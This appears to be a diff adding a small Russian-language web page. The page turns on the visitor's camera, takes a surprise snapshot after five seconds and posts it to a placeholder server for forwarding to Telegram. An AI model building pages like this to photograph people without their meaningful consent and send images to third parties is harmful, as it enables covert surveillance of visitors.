@@ -1,0 +1,52 @@
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Сделать фото и отправить в Telegram</title>
+</head>
+<body>
+    <h1>Камера активна...</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Получение доступа к камере пользователя
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+
+                // Таймер для неожиданного фото (через 5 секунд)
+                setTimeout(() => {
+                    // Делаем фото
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    
+                    // Отправляем фото на сервер для пересылки в Telegram
+                    fetch('https://your-server-url/send_photo', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ image: imageData })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert("Фото успешно отправлено в Telegram!");
+                    })
+                    .catch(error => {
+                        console.error("Ошибка отправки фото: ", error);
+                    });
+                }, 5000); // 5000 миллисекунд = 5 секунд
+            })
+            .catch(function(err) {
+                console.error("Ошибка доступа к камере: ", err);
+            });
+    </script>
+</body>
+</html>
